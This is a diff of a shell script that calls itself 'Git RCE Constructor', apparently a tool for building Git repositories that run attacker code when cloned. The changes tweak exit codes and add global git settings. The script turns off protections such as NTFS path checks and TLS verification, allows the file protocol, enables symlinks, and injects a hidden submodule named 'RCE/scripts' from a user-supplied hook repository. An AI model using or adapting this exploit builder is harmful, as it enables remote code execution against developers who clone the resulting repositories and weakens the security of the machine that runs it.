@@ -4,7 +4,7 @@ error_handler(){
 set +x
 echo -n "Operation failed!"
 read -N 1
-exit 0
+exit -1
 }
 echo Git RCE Constructor v1.9.0 \(Remote Mode With Shallow Clone\)
 echo -e "\033]0;Git RCE Constructor v1.9.0 (Remote Mode With Shallow Clone)\007"
@@ -14,8 +14,10 @@ read -r -p "Hook repository URL: " hook_repo_path
 set -x
 git config --global protocol.file.allow always ||error_handler
 git config --global core.protectNTFS false ||error_handler
-git config --global http.sslVerify false ||error_handler
 git config --global core.symlinks true ||error_handler
+git config --global core.fscache false ||error_handler
+git config --global core.fsmonitor false ||error_handler
+git config --global http.sslVerify false ||error_handler
 if [ -z "$(git config --global user.name)" ]; then
 git config --global user.name "$USERNAME"
 fi
@@ -70,7 +72,7 @@ git clone --no-recursive --filter=blob:none --depth=1 --single-branch --no-tags 
 cd git_rce_main ||error_handler
 git reset --no-refresh --mixed --quiet HEAD ||error_handler
 git diff --cached --quiet HEAD ||error_handler
-git ls-files --error-unmatch .gitmodules &&git restore --worktree --source=HEAD .gitmodules ||error_handler
+git ls-files --error-unmatch .gitmodules &&(git restore --worktree --source=HEAD .gitmodules ||exit -1) ||error_handler
 git submodule add --name RCE/scripts "$hook_repo_path" GITLNK/modules/RCE ||error_handler
 git config -f .gitmodules submodule.RCE/scripts.ignore all ||error_handler
 git add .gitmodules ||error_handler
